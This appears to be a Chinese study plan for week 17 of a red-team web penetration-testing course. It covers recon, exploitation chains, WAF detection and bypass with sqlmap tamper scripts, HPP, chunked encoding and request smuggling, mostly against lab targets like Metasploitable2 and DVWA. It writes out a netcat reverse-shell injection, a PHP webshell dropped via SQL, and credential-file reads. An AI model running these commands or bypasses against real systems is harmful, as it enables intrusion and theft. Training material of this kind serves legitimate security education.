@@ -1,0 +1,524 @@
+================================================================================
+第17周：Web综合实战 (Web综合期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+以"完整Web渗透测试流程"为贯穿案例，学员将前4周所学Web安全知识融会贯通，
+完成从信息收集、漏洞发现、漏洞利用到后渗透的完整攻击链。随后深入学习WAF
+（Web应用防火墙）检测与识别，掌握sqlmap tamper脚本、高级绕过技术（HPP、
+分段传输、请求走私）等对抗WAF的技能。本阶段属于"Web综合期"，是对Web渗透
+技能的系统整合和实战检验。
+
+【本周学习目标】
+1. 掌握完整Web渗透测试方法论和标准流程
+2. 能够独立执行：信息收集 -> 漏洞扫描 -> 手工验证 -> 漏洞利用 -> 后渗透
+3. 熟练组合使用多个Web渗透工具：nmap/sqlmap/Burp/nikto/gobuster等
+4. 掌握WAF检测技术：wafw00f、手工请求特征分析、图片/图标检测
+5. 掌握sqlmap tamper脚本的深度使用和自定义tamper编写
+6. 掌握HTTP参数污染(HPP)、分段传输、请求走私等高级绕过技术
+7. 能够分析WAF规则并制定针对性的绕过策略
+8. 完成一个完整的Web渗透测试报告
+
+【本周知识清单】
+★ 完整Web渗透测试流程
+  - 第一阶段：侦察(Reconnaissance)
+    * 域名信息：whois、dnsrecon、子域名枚举(sublist3r/amass)
+    * 技术指纹：Wappalyzer、WhatWeb、BuiltWith
+    * 目录枚举：gobuster、dirb、dirsearch、ffuf
+    * 参数发现：paramspider、Arjun
+    * 端口扫描：nmap -sV -sC -p-
+  - 第二阶段：漏洞发现(Vulnerability Discovery)
+    * 自动化扫描：nikto、wpscan、joomscan
+    * 半自动检测：Burp Scanner(Active/Passive)
+    * 手工测试：输入点注入测试、认证测试、逻辑测试
+    * 版本对比：识别组件版本 -> CVE搜索
+  - 第三阶段：漏洞利用(Exploitation)
+    * Web攻击：SQLi, XSS, LFI/RFI, Command Injection, CSRF
+    * 文件上传 -> WebShell -> 提权
+    * 认证绕过 -> 权限提升
+  - 第四阶段：后渗透(Post-Exploitation)
+    * WebShell高级功能（文件管理、数据库操作、命令执行）
+    * 横向移动：SSH密钥窃取、内网扫描
+    * 信息收集：配置文件、数据库凭证、日志敏感信息
+
+★ WAF检测与识别
+  - WAF (Web Application Firewall) 定义：防护Web应用的防火墙
+  - 常见WAF产品：ModSecurity, Cloudflare, AWS WAF, Imperva, F5 Big-IP, FortiWeb
+  - WAF检测技术：
+    * wafw00f自动化检测：wafw00f https://target.com
+    * 手工检测：发送恶意payload观察响应特征
+    * 特征识别：响应头(X-CDN, Server, X-Sucuri-ID)、HTTP状态码、错误页面
+    * Cookie识别：特定WAF会在Cookie中留下标记
+    * 图标检测：favicon.ico的hash匹配已知WAF
+  - WAF工作模式：
+    * 黑名单模式(Negative Model)：拦截已知攻击特征
+    * 白名单模式(Positive Model)：只允许已知安全请求
+    * 混合模式：两者结合
+
+★ sqlmap Tamper脚本深度掌握
+  - tamper目录理解：/usr/share/sqlmap/tamper/
+  - 常用tamper分类及使用场景：
+    * 空格/注释替换：space2comment, space2hash, space2plus, space2mssql
+    * 关键字混淆：between, equaltolike, ifnull2ifisnull, greatest
+    * 编码绕过：charencode, chardoubleencode, charunicodeencode, base64encode
+    * 大小写变形：randomcase, uppercase, lowercase
+    * 特殊字符处理：apostrophemask, apostrophenullencode
+    * 数据库特化：versionedkeywords(mysql), percentage(mssql), substr2limit
+  - tamper组合策略：从简单到复杂的递进式绕过
+  - 自定义tamper脚本编写：
+    * 理解tamper模板(tamper函数签名)
+    * 根据WAF过滤规则定制修改逻辑
+    * 测试并迭代优化tamper
+
+★ 高级绕过技术
+  - HTTP参数污染(HPP - HTTP Parameter Pollution)：
+    * 发送同名参数的多个实例：?id=1&id=2
+    * 不同平台后参数行为不同（取第一个 vs 取最后一个 vs 拼接）
+    * 用于绕过WAF签名检测
+  - 分段传输(Chunked Transfer Encoding)：
+    * HTTP Transfer-Encoding: chunked头
+    * 将payload分段传输拆散恶意特征
+    * 使用Burp插件或自定义脚本构造
+  - HTTP请求走私(HTTP Request Smuggling)：
+    * CL.TE (Content-Length vs Transfer-Encoding)不一致
+    * TE.CL 不一致
+    * TE.TE (双重Transfer-Encoding)
+    * 利用前端/后端解析差异走私恶意请求
+  - 编码/混淆技术组合：
+    * URL编码 + Unicode编码 + HTML实体编码 + Base64
+    * 协议级混淆
+
+【本周工具清单】
+  - nmap (端口扫描)
+  - gobuster/dirb (目录枚举)
+  - sqlmap (SQL注入自动化)
+  - Burp Suite (Web代理/扫描)
+  - wafw00f (WAF检测)
+  - whatweb/wappalyzer (技术指纹)
+  - nikto (Web扫描器)
+  - curl (HTTP测试)
+
+================================================================================
+周一：完整Web渗透流程
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Web渗透测试标准方法论和完整四阶段流程
+  - 渗透测试标准框架：PTES, OWASP Testing Guide, OSSTMM
+  - Web渗透四阶段方法论：
+    阶段1-侦察：信息收集是渗透测试的基础
+    阶段2-漏洞发现：识别安全短板
+    阶段3-漏洞利用：验证漏洞危害
+    阶段4-后渗透：深入挖掘内网价值
+  - 侦察阶段关键技术：
+    * 子域名枚举：证书透明度(crt.sh)、DNS brute force、搜索引擎
+    * 技术栈识别：HTTP响应头、HTML源码、JS文件、错误页面
+    * 内容发现：目录/文件枚举、参数发现、API端点发现
+    * 攻击面映射：绘制目标的功能架构和技术栈图谱
+  - 漏洞发现阶段策略：
+    * 自动化扫描工具覆盖常见漏洞
+    * 手工测试覆盖逻辑漏洞和业务逻辑缺陷
+    * 版本漏洞关联：组件版本 -> CVE -> PoC
+    * 优先级排序：高危(RCE/SQLi/文件上传) > 中危(XSS/LFI/IDOR) > 低危
+  - 从单点漏洞到完整攻击链：串联合并漏洞升级危害
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/08-Web渗透综合实战.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：对Metasploitable2的Web服务执行完整的渗透测试流程
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/08-Web渗透综合实战.txt
+
+  操作步骤：
+    Step 1: 建立工作目录: mkdir ~/web_pentest_ms2 && cd ~/web_pentest_ms2
+    Step 2: 信息收集第一阶段 - 端口扫描:
+      nmap -sV -sC -O -p- -oA nmap_full 192.168.56.101
+    Step 3: 查看扫描结果: cat nmap_full.nmap | grep -E "open|http|PORT"
+    Step 4: 识别Web相关服务端口: 80(HTTP), 443(HTTPS), 8180, 8080等
+    Step 5: 技术栈识别:
+      whatweb http://192.168.56.101
+      whatweb http://192.168.56.101/dvwa
+      whatweb http://192.168.56.101/mutillidae
+    Step 6: 目录枚举:
+      gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -o gobuster_root.txt
+      gobuster dir -u http://192.168.56.101/dvwa -w /usr/share/wordlists/dirb/common.txt -o gobuster_dvwa.txt
+    Step 7: 自动化Web漏洞扫描:
+      nikto -h http://192.168.56.101 -o nikto_scan.txt
+    Step 8: 查看nikto发现的问题: cat nikto_scan.txt
+    Step 9: 手工浏览Web应用:
+      浏览器访问 http://192.168.56.101 - 查看默认页面
+      浏览器访问 http://192.168.56.101/dvwa
+      浏览器访问 http://192.168.56.101/mutillidae
+      浏览器访问 http://192.168.56.101/phpMyAdmin
+    Step 10: 使用Burp Suite爬取应用结构:
+      Burp Suite -> Proxy -> 开启拦截 -> 浏览各应用
+      Burp Suite -> Target -> Site map 查看自动爬取的页面结构
+    Step 11: 识别登录页面和认证机制
+    Step 12: 发现文件上传功能点
+    Step 13: 生成信息收集报告: 汇总所有发现的端口、服务、技术栈、目录结构
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周二：信息收集 -> 漏洞发现 -> 利用链（后半）
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：从信息收集到漏洞利用的完整攻击链串联
+  - 攻击链构建思维：
+    * 不要孤立地看每个漏洞
+    * 思考如何组合多个低危漏洞达到高危效果
+    * 例如：文件上传+文件包含=LFI+RCE
+    * 例如：XSS+CSRF=绕过CSRF Token防护
+    * 例如：SQL注入+文件写入=WebShell
+  - 漏洞优先级判断：
+    * 先攻击最有可能成功的高危漏洞（RCE、文件上传、SQLi）
+    * 再考虑需要条件组合的攻击链
+    * 最后测试信息泄露和低危漏洞
+  - 典型攻击链组合模式：
+    模式1: 弱密码 -> 登录后台 -> 文件上传 -> Webshell -> 提权
+    模式2: SQL注入 -> 读取文件 -> 获取凭证 -> SSH登录
+    模式3: LFI -> 日志投毒 -> RCE -> 反弹Shell
+    模式4: XSS -> Cookie窃取 -> Session劫持 -> 后台操作
+    模式5: 命令注入 -> 反弹Shell -> Meterpreter后渗透
+  - 后渗透信息收集清单：
+    * 系统信息：uname -a, cat /etc/issue, cat /proc/version
+    * 用户信息：cat /etc/passwd, cat /etc/shadow, who, w, last
+    * 网络信息：ifconfig, route -n, netstat -tlnp, arp -a
+    * 进程信息：ps aux, ls -la /proc/
+    * 凭证信息：history文件, .ssh/, .bashrc, 配置文件, 环境变量
+    * 数据库凭证：config.php, wp-config.php, .env, application.properties
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：对Metasploitable2完成完整的漏洞发现到利用链实战
+  操作步骤：
+    Step 1: 利用昨日信息收集结果，识别可攻击点:
+      - DVWA (包含SQLi, XSS, LFI, 命令注入, CSRF, 文件上传等)
+      - Mutillidae (更多OWASP漏洞)
+      - phpMyAdmin (数据库管理，弱密码: root/(空))
+      - TWiki (CVE-2018-1000001等已知漏洞)
+    Step 2: 攻击路径1 - phpMyAdmin直接获取数据库控制:
+      访问 http://192.168.56.101/phpMyAdmin
+      尝试弱密码: root (无密码) 或 root:root
+      进入后执行SQL查询: SELECT LOAD_FILE('/etc/passwd')
+      尝试写入文件: SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/shell.php'
+    Step 3: 攻击路径2 - DVWA SQL注入到WebShell:
+      访问 http://192.168.56.101/dvwa 登录 (admin/password)
+      SQL注入页面，使用sqlmap提取数据
+      尝试sqlmap --os-shell获取系统Shell
+    Step 4: 攻击路径3 - DVWA命令注入到反弹Shell:
+      命令注入页面输入: 127.0.0.1; nc -e /bin/bash 192.168.56.1 4444
+      攻击机监听: nc -lvp 4444
+    Step 5: 攻击路径4 - DVWA文件上传到WebShell:
+      文件上传页面，修改Content-Type绕过
+      上传PHP一句话木马
+      使用中国蚁剑/weevely连接
+    Step 6: 选择至少一个攻击路径成功获取Shell
+    Step 7: 在获得的Shell中进行后渗透信息收集:
+      whoami; id; uname -a
+      cat /etc/passwd
+      ls -la /home
+      find / -type f -name "*.conf" 2>/dev/null
+      cat /var/www/html/dvwa/config/config.inc.php  (DVWA配置文件)
+    Step 8: 整理从信息收集到后渗透的完整攻击链文档
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周三：WAF检测与识别
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：WAF检测技术、常见WAF产品识别和绕过策略思维
+  - WAF (Web Application Firewall) 定义：
+    * 位于Web应用之前的安全防护系统
+    * 通过HTTP/HTTPS流量分析防护攻击
+    * 工作在OSI第7层（应用层）
+  - WAF检测的实用价值：
+    * 知道有WAF -> 调整攻击工具和策略
+    * 识别WAF品牌 -> 查找已知绕过方法
+    * 无WAF -> 可以使用更直接的攻击payload
+  - WAF检测方法：
+    1. wafw00f自动化检测：wafw00f -a https://target.com
+    2. 手工发送恶意payload观察响应：
+       - 发送 <script>alert(1)</script> 观察是否被拦截
+       - 发送 ' OR 1=1 -- 观察拦截页面
+       - 发送 ../../../../../etc/passwd 观察返回状态码
+    3. HTTP响应头分析：
+       - X-CDN: CloudFront, Cloudflare
+       - Server: 如果隐藏或返回不寻常值可能是WAF
+       - X-Sucuri-ID, X-Sucuri-Cache (Sucuri WAF)
+       - CF-Ray (Cloudflare)
+    4. HTTP状态码分析：
+       - 403 Forbidden（被WAF拦截）
+       - 406 Not Acceptable
+       - 501 Not Implemented
+    5. Cookie特征：
+       - __cfduid (Cloudflare)
+       - citrix_ns_id (Citrix NetScaler)
+       - F5 BIG-IP cookie
+    6. 响应内容分析：
+       - 错误页面特征
+       - JavaScript Challenge页面(Cloudflare)
+    7. favicon.ico hash匹配
+  - WAF绕过思路总览：
+    * 协议级绕过：HTTP/2, WebSocket, 请求走私
+    * 编码绕过：URL/Unicode/Base64/Hex编码payload
+    * 混淆绕过：大小写、注释、变量拼接
+    * 流量切分：分段传输payload
+    * 架构绕过：直接访问源服务器IP（绕过CDN/WAF）
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/09-WAF绕过与高级技巧.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：安装并练习wafw00f，手工WAF检测技术
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/09-WAF绕过与高级技巧.txt
+
+  操作步骤：
+    Step 1: sudo apt install wafw00f 安装WAF检测工具
+    Step 2: wafw00f -h 查看帮助信息
+    Step 3: wafw00f -l 列出wafw00f能检测的所有WAF品牌
+    Step 4: 在本地搭建ModSecurity进行WAF检测练习:
+      sudo apt install libapache2-mod-security2
+      sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
+      sudo systemctl restart apache2
+    Step 5: wafw00f http://localhost 检测本地WAF
+    Step 6: wafw00f https://www.cloudflare.com 检测Cloudflare自身的WAF
+    Step 7: wafw00f -a https://example.com 对真实网站进行多种方式综合检测
+    Step 8: 手工WAF检测练习:
+      发送正常请求: curl -v http://localhost/
+      发送恶意payload: curl -v "http://localhost/?q=<script>alert(1)</script>"
+      发送SQL注入: curl -v "http://localhost/?id=1' OR '1'='1"
+      比较正常请求和恶意请求的响应差异（状态码、响应体、响应头）
+    Step 9: 分析WAF拦截响应的特征：
+      wafw00f会根据响应特征匹配WAF Fingerprint
+    Step 10: 如果检测到WAF，研究如何找到源站IP：
+      dig domain.com
+      SecurityTrails / Censys / Shodan
+      DNS历史记录查询
+    Step 11: 对比有WAF和无WAF环境下sqlmap的检测结果差异:
+      sqlmap -u "http://localhost/vulnerable.php?id=1" --batch (本地测试)
+      观察--waf检测: sqlmap --check-waf
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周四：sqlmap tamper脚本绕过
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：sqlmap tamper脚本高级使用和自定义编写
+  - tamper脚本工作原理：
+    * tamper()函数接收原始payload字符串
+    * 返回修改后的payload字符串
+    * sqlmap在发送每个payload前自动调用tamper函数
+  - tamper分类策略：
+    1. 针对特定WAF的tamper：modsecurityversioned.py, modsecurityzeroversioned.py
+    2. 针对特定关键字的tamper：equaltolike.py(=改为LIKE), greatest.py(>改为GREATEST)
+    3. 针对空格过滤的tamper：space2comment.py, space2hash.py, space2plus.py
+    4. 针对编码的tamper：charencode.py, chardoubleencode.py, charunicodeencode.py
+    5. 针对数据库特性的tamper：versionedkeywords.py(MySQL版本注释), percentage.py(MSSQL)
+  - tamper组合使用原则：
+    * 先单独测试每个tamper的效果
+    * 从温和的tamper开始（如space2comment）
+    * 逐渐叠加更具侵略性的tamper
+    * 通过--proxy参数观察实际发送的请求
+    * 避免过度使用tamper导致payload失效
+  - 自定义tamper模板：
+    ```python
+    from lib.core.enums import PRIORITY
+    __priority__ = PRIORITY.NORMAL
+    def dependencies():
+        pass
+    def tamper(payload, **kwargs):
+        # 自定义修改逻辑
+        return modified_payload
+    ```
+  - 常见WAF对应的tamper组合：
+    * Cloudflare: space2comment, randomcase, charencode
+    * ModSecurity: space2comment, versionedkeywords, between
+    * Imperva: space2hash, randomcase, chardoubleencode
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/09-WAF绕过与高级技巧.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：测试各种tamper脚本组合，编写自定义tamper
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/09-WAF绕过与高级技巧.txt
+
+  操作步骤：
+    Step 1: ls /usr/share/sqlmap/tamper/ 浏览所有tamper脚本
+    Step 2: cat /usr/share/sqlmap/tamper/space2comment.py 查看tamper源码
+    Step 3: cat /usr/share/sqlmap/tamper/between.py 查看between tamper源码
+    Step 4: DVWA安全级别设为Low，测试无tamper时的sqlmap性能
+    Step 5: sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --tamper=space2comment --proxy=http://127.0.0.1:8080 --batch -D dvwa -T users --dump
+    Step 6: 在Burp Suite中观察space2comment tamper转换了哪些字符
+    Step 7: 测试between tamper: --tamper=between
+    Step 8: 测试charencode tamper: --tamper=charencode
+    Step 9: 测试randomcase tamper: --tamper=randomcase
+    Step 10: 组合测试: --tamper=space2comment,randomcase,between
+    Step 11: 组合测试: --tamper=charencode,chardoubleencode
+    Step 12: 对比每种tamper对payload的修改效果（通过Burp历史记录）
+    Step 13: 启用ModSecurity作为WAF:
+      sudo a2enmod security2 && sudo systemctl restart apache2
+    Step 14: 在有ModSecurity的环境下测试sqlmap:
+      sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --batch (无tamper)
+    Step 15: 使用tamper绕过ModSecurity:
+      --tamper=space2comment,versionedkeywords,randomcase
+    Step 16: 创建自定义tamper脚本 mytamper.py:
+      复制space2comment.py，修改替换逻辑
+      放入/usr/share/sqlmap/tamper/目录
+      使用--tamper=mytamper测试
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周五：高级绕过技术 (HPP, 分段传输, 请求走私)
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：HTTP参数污染、分段传输、HTTP请求走私等高级WAF绕过技术
+  - HTTP参数污染(HPP - HTTP Parameter Pollution)：
+    * 原理：发送同名HTTP参数的多个实例
+    * 例如：?search=good&search=<script>alert(1)</script>
+    * WAF可能只检查第一个search参数，后端可能取最后一个
+    * 服务器行为差异：
+      - PHP/Apache: 取最后一个值
+      - ASP.NET/IIS: 用逗号连接所有值
+      - JSP/Tomcat: 取第一个值
+      - Python/Flask: 返回列表
+      - Node.js/Express: 返回数组
+    * 利用HPP绕过WAF的条件：WAF和后端对参数处理方式不一致
+    * 也可用于绕过认证和逻辑漏洞
+  - 分段传输(Chunked Transfer Encoding)：
+    * 原理：使用HTTP Transfer-Encoding: chunked头将payload分段发送
+    * 每个chunk有长度前缀，多个chunk组成完整请求体
+    * WAF可能无法正确重组chunked数据流
+    * Burp Suite插件：chunked-coding-converter
+    * 手动构造chunked请求：
+      POST / HTTP/1.1
+      Transfer-Encoding: chunked
+      5\r\nhello\r\n6\r\n world\r\n0\r\n\r\n
+    * 在chunked传输中嵌入恶意payload绕过WAF规则匹配
+  - HTTP请求走私(HTTP Request Smuggling)：
+    * 原理：前端代理和后端服务器对HTTP请求边界解析不一致
+    * 导致攻击者可以将恶意请求"走私"到下一个正常用户的请求前
+    * CL.TE攻击：前端用Content-Length，后端用Transfer-Encoding
+    * TE.CL攻击：前端用Transfer-Encoding，后端用Content-Length
+    * TE.TE攻击：双重Transfer-Encoding
+    * 利用场景：
+      - 绕过前端WAF安全检查
+      - 缓存投毒
+      - 劫持其他用户的请求
+      - 反射型XSS升级到存储型
+  - 其他高级绕过技术：
+    * HTTP/2 downgrade
+    * WebSocket隧道
+    * 编码链：UTF-7 / UTF-16 / IBM037 EBCDIC
+    * 协议版本混淆：HTTP/0.9, HTTP/1.0
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/09-WAF绕过与高级技巧.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：实践HPP、分段传输等高级绕过技术
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/09-WAF绕过与高级技巧.txt
+
+  操作步骤：
+    Step 1: HPP漏洞测试:
+      DVWA SQL注入页面(Low)，测试:
+      ?id=1&id=2&Submit=Submit (观察返回哪个id的结果)
+      ?id=1'&id=SELECT user,password FROM users-- -&Submit=Submit
+    Step 2: 使用Burp Intruder测试各种HPP变体
+    Step 3: 研究DVWA对HPP的处理方式（PHP取最后一个参数）
+    Step 4: 分段传输(Chunked)实验:
+      在Burp Suite中安装Chunked coding converter插件
+    Step 5: 禁用Content-Length，启用Transfer-Encoding: chunked
+    Step 6: 构造chunked POST请求到DVWA
+    Step 7: 将SQL注入的恶意payload分段到不同的chunk中
+    Step 8: 观察ModSecurity是否能检测到分段后的SQL注入
+    Step 9: HTTP请求走私学习:
+      使用docker搭建请求走私测试环境:
+      docker pull defparam/smuggler
+      或访问 PortSwigger Web Security Academy的请求走私实验室
+    Step 10: 测试CL.TE漏洞:
+      构造Content-Length和Transfer-Encoding同时存在的请求
+      观察前后端解析差异
+    Step 11: 测试TE.CL漏洞
+    Step 12: 使用smuggler.py工具自动检测请求走私漏洞:
+      git clone https://github.com/defparam/smuggler
+      python3 smuggler.py -u http://target.com
+    Step 13: 尝试使用请求走私技术绕过WAF检测
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB/THM)
+================================================================================
+
+📝 第1小时 | 周知识点回顾 (08:00 - 09:00)
+  复习清单：
+  - Web渗透四阶段方法论：侦察->发现->利用->后渗透
+  - WAF检测方法汇总：wafw00f, 手工测试, 响应头, Cookie, 状态码, 图标
+  - sqlmap tamper分类：空格/注释替换、关键字混淆、编码、大小写
+  - HPP原理和服务器差异：PHP取最后, ASP.NET拼逗号, JSP取第一
+  - 分段传输原理：Transfer-Encoding: chunked拆分payload
+  - 请求走私原理：CL.TE/TE.CL/TE.TE前后端解析差异
+
+💻 第2小时 | 综合实战练习 (09:00 - 10:00)
+  练习内容：不参考笔记，完成一个完整的Web渗透测试流程
+  操作步骤：
+    Step 1: 选择目标：DVWA 或 本地模拟Web应用
+    Step 2: 独立完成：信息收集 -> WAF检测 -> 漏洞扫描 -> 漏洞利用 -> 后渗透
+    Step 3: 尝试使用WAF绕过技术（tamper + HPP + chunked）
+    Step 4: 记录完整的渗透测试过程
+
+🔓 第3小时 | HackTheBox / TryHackMe Web挑战 (10:00 - 11:00)
+  练习内容：在在线平台上应用本周学到的综合Web渗透技能
+  操作步骤：
+    Step 1: 连接HTB VPN
+    Step 2: 选择一台Medium难度Web靶机
+    Step 3: 完整执行信息收集 -> WAF检测 -> 漏洞发现 -> 漏洞利用
+    Step 4: 尝试识别目标是否部署了WAF
+    Step 5: 记录完整的攻击路径和所使用的技术
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/archstrike-web教学/08-Web渗透综合实战.txt
+  /home/a/成长为一个红队/archstrike-web教学/09-WAF绕过与高级技巧.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-web教学/08-Web渗透综合实战.txt
+  /home/a/成长为一个红队/archstrike-web教学/09-WAF绕过与高级技巧.txt
+
+在线练习：
+  - Metasploitable2 Web服务 (http://192.168.56.101)
+  - DVWA (http://localhost/dvwa)
+  - HackTheBox (https://app.hackthebox.com)
+  - TryHackMe Web挑战 (https://tryhackme.com)
+  - PortSwigger Web Security Academy (https://portswigger.net/web-security/all-topics)
+
+推荐工具安装：
+  - wafw00f (sudo apt install wafw00f)
+  - gobuster (sudo apt install gobuster)
+  - nikto (sudo apt install nikto)
+  - whatweb (sudo apt install whatweb)
+  - dirb (sudo apt install dirb)
+  - smuggler.py (git clone https://github.com/defparam/smuggler)
+  - ModSecurity (sudo apt install libapache2-mod-security2)
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
